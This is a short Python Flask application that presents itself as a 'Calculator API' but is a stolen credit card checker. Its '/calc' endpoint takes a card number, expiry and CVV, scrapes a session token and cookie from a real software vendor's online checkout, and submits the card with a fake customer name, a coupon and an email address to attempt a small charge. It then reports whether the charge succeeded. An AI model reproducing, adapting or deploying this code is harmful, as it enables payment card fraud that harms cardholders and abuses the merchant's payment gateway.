import random
import string
import re
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/")
def home():
    return jsonify({"message": "Calculator API is running"})


    
@app.route("/calc", methods=["GET"])
def chk():
	g = request.args.get("cc")
	url = "https://shop.superantispyware.com/sas/carts/"
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'sec-fetch-site': "none",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
	}
	
	response = requests.get(url, headers=headers)
	ks=response.text.split('name="kount_session_id" type="hidden" value=')[1].split('"')[1]
	uw=response.cookies['usts_web']
	k=g.split('\n')[0]
	cc=k.split('|')[0]
	exp=k.split('|')[1]
	exy=k.split('|')[2]
	try:
		exy=exy[2]+exy[3]
	except:
		pass
	cvc=k.split('|')[3]
	url = "https://shop.superantispyware.com/sas/carts/"
	
	payload = {
	  'view': "",
	  'ock': "saspro1y3-ltc1m1-v2026",
	  'sku': "",
	  'coupon': "SAS2026",
	  'customer[first_name]': "michal",
	  'customer[last_name]': "aguro",
	  'cc': "1",
	  'total': "21.72",
	  'credit_card[account]': cc,
	  'credit_card[expiration_date]': f"{exp}/{exy}",
	  'credit_card[cvv]': f"{cvc}",
	  'customer[email_address]': "mosalah92005@gmail.com",
	  'billing_address[country]': "US",
	  'billing_address[state]': "NY",
	  'billing_address[postal_code]': "10090",
	  'agreement': "on",
	  'new_coupon': "",
	  'kount_session_id': ks,
	  '_submit': "credit"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'cache-control': "max-age=0",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'origin': "https://shop.superantispyware.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'referer': "https://shop.superantispyware.com/sas/carts/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "usts_web="+uw
	}
	
	response = requests.post(url, data=payload, headers=headers)
	try:
		result=response.text.split('class="message">')[1].split('</div>')[0].split('>')[1].split('\n')[0]
		return ({
           'card': g,
           'amount': '20$',
            "gateway": 'AuthNet',
            "result": result
        })
	except:
		return ({
           'card': g,
           'amount': '20$',
            "gateway": 'AuthNet',
            "result": "charge ✅"
        })

# مهم لـ Vercel
def handler(environ, start_response):
    return app(environ, start_response)
    
